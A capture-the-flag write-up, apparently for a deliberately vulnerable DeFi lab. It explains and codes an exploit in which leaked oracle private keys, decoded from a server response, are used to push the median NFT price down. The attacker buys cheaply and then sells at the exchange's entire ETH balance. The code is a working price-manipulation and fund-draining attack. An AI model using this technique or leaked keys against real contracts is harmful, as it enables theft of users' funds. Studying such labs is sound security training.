## Explanation
1. From the response take first one and decode it from hex to text.
2. Then decode it from text to base64 you can see it looks like something familiar :)
3. These are the private keys for 2 of the trustful oracle.
4. So with this we can manipulate the price of the oracles.
5. We create function that allow to setMedainPrice as it the oracle is set based on medain price.
6. We setMedainPrice to 0.01 and buy an nft
7. Now we set the nft price to the balance of the address to get all ETH
8. We sellOne and then we returns the price back.
```javascript
// from the response of the web you can decode the hexadecimal to text, then the text to base64
        const key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        const key2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';

        const orcale1 = new ethers.Wallet(key1,ethers.provider);
        const orcale2 = new ethers.Wallet(key2,ethers.provider);

        const orcl1Trust = this.oracle.connect(orcale1);
        const orcl2Trust = this.oracle.connect(orcale2);

        const setMedianPrice = async (amount) => {
           
            await orcl1Trust.postPrice("DVNFT", amount)
            await orcl2Trust.postPrice("DVNFT", amount)

        }

        // we make the price returned by the medain to 0.01
        await setMedianPrice(ethers.utils.parseEther("0.01"))

        const attackExchange = this.exchange.connect(attacker);
        const attackNFT = this.nftToken.connect(attacker);
        
        //attacker purchase the nft on 0.01
        let priceToSet = ethers.utils.parseEther("0.01");
        await attackExchange.buyOne({
            value: priceToSet
        })

        //setting the price of nft to exchange address
        const balOfExchange = await ethers.provider.getBalance(this.exchange.address);
        
        await setMedianPrice(balOfExchange)
        
        //selling it
        await attackNFT.approve(attackExchange.address,0)
        await attackExchange.sellOne(0)

        //setting orcale price back
        await setMedianPrice(INITIAL_NFT_PRICE)
```